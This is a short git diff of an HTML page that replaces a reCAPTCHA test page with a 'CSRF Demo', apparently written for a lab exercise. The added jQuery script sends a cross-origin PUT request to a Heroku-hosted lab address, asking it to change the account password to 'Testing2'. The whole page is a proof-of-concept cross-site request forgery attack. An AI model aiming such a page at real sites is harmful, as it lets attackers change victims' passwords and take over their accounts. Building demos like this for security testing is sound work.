@@ -1,9 +1,44 @@
 <!DOCTYPE html>
+
 <html>
+
 <head>
-	<title>reCaptchaV3 Test Page</title>
+	<title>CSRF Demo</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $('#submit').click(  function () {
+                console.log("click");
+                var sendData = $('#data').val();
+
+                $.ajax({
+                    url: 'https://clazba-lab.herokuapp.com/',
+                    contentType: 'application/json', 
+                    type: 'PUT',  
+                    data: {
+						  "profile": {
+						    "newPassword": "Testing2"
+						  },
+						  "security": {
+						    "password": "Testing2"
+						  },
+						  "operation": "update_password"
+						},    
+                    success: function () {
+                    }
+                })
+                ;
+
+            });
+        });
+    </script>
 </head>
 <body>
-
+<form>
+    Data:<br>
+    <input id="data" type="text" name="data" value="CSRF"><br>
+    <input id="submit" type="button"  value="Submit">
+</form>
 </body>
 </html>
